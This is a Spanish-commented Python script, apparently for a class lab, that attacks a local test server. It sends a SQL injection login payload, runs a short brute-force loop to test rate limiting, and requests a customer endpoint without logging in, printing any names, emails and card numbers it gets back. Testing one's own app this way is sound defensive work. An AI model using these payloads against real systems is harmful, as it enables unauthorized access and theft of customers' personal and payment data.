import requests
import time

# La dirección donde tu compañera tiene levantado el servidor
URL_BASE = "http://127.0.0.1:5000"

print("=== INICIANDO HERRAMIENTA DE ATAQUE AUTOMATIZADA ===")
time.sleep(1)

# ----------------------------------------------------------------
# ATAQUE 1: Intento de Inyección SQL en el Login
# ----------------------------------------------------------------
print("\n[+] FASE 1: Lanzando ataque de Inyección SQL (SQLi)...")
payload_sqli = {
    "username": "admin' OR '1'='1",
    "password": "password_cualquiera"
}
respuesta_sqli = requests.post(f"{URL_BASE}/login", json=payload_sqli)

if respuesta_sqli.status_code == 401:
    print("[-] SQLi falló. El servidor parece estar sanitizando las entradas (Consultas Parametrizadas activas).")
else:
    print("[!] SQLi exitoso o comportamiento inesperado.")

time.sleep(1)

# ----------------------------------------------------------------
# ATAQUE 2: Ataque de Fuerza Bruta (Test de Rate Limiting)
# ----------------------------------------------------------------
print("\n[+] FASE 2: Lanzando ataque de Fuerza Bruta rapido (6 intentos en bucle)...")
for i in range(1, 7):
    payload_bruto = {"username": "admin", "password": f"clave_{i}"}
    res = requests.post(f"{URL_BASE}/login", json=payload_bruto)
    
    if res.status_code == 429: # 429 significa "Too Many Requests"
        print(f"[-] Intento {i} bloqueado por el servidor. Rate Limiting activado.")
        break # Detenemos el ataque porque ya nos bloquearon
    else:
        print(f"[*] Intento {i}: {res.json().get('error', 'Error desconocido')}")

time.sleep(1)

# ----------------------------------------------------------------
# ATAQUE 3: Explotación de Control de Acceso (Extracción de Datos)
# ----------------------------------------------------------------
print("\n[+] FASE 3: Buscando endpoints sin autenticacion (Broken Access Control)...")
print("[*] Intentando acceder a /clientes sin iniciar sesion...")

respuesta_clientes = requests.get(f"{URL_BASE}/clientes")

if respuesta_clientes.status_code == 200:
    datos_robados = respuesta_clientes.json()
    print("[!] EXITO: Se vulneró el control de acceso. ¡Datos extraídos!")
    print(f"[!] Se encontraron {len(datos_robados)} registros de clientes.")
    print("\nMuestra de los datos robados:")
    
    # Imprimimos los primeros 2 clientes para el reporte
    for cliente in datos_robados[:2]:
        print(f"    - Nombre: {cliente['nombre']}")
        print(f"    - Email: {cliente['email']}")
        print(f"    - Tarjeta: {cliente['num_tarjeta']}")
        print(f"    - Fecha Reg: {cliente['fecha_registro']}")
        print("    " + "-"*30)
else:
    print("[-] El endpoint está protegido.")

print("\n=== ATAQUE FINALIZADO ===")